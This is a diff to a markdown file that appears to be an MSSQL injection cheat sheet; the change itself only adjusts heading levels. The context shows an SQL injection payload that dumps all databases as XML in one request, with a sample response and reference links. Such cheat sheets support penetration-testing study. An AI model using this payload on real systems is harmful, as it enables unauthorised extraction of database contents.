@@ -43,7 +43,7 @@ Host: hack-yourself-first.com
 **CAUTION**
 The following query should be executed with caution as it has the potential to impact the performance of MSSQL, depending on the size of the table entries returned. It is recommended to run it only when there is confidence that the returned row isn't excessively long.
 
-DUMP all in one shot using XML
+### DUMP all in one shot using XML
 Request
 ```
 (select * from master..sysdatabases) for xml PATH('')
@@ -53,11 +53,11 @@ Response
 <name>master</name><dbid>1</dbid><sid>AQ==</sid><mode>0</mode><status>65544</status><status2>
 ```
 
-### Inspired by
+## Inspired by
 * https://blog.improsec.com/tech-blog/dangers-mssql-features-impersonation-amp-links
 * https://www.madeiradata.com/post/how-to-protect-sql-server-from-hackers-and-penetration-tests
 
-### Resources
+## Resources
 * https://github.com/ktaranov/sqlserver-kit
 * https://github.com/quentinhardy/msdat
 
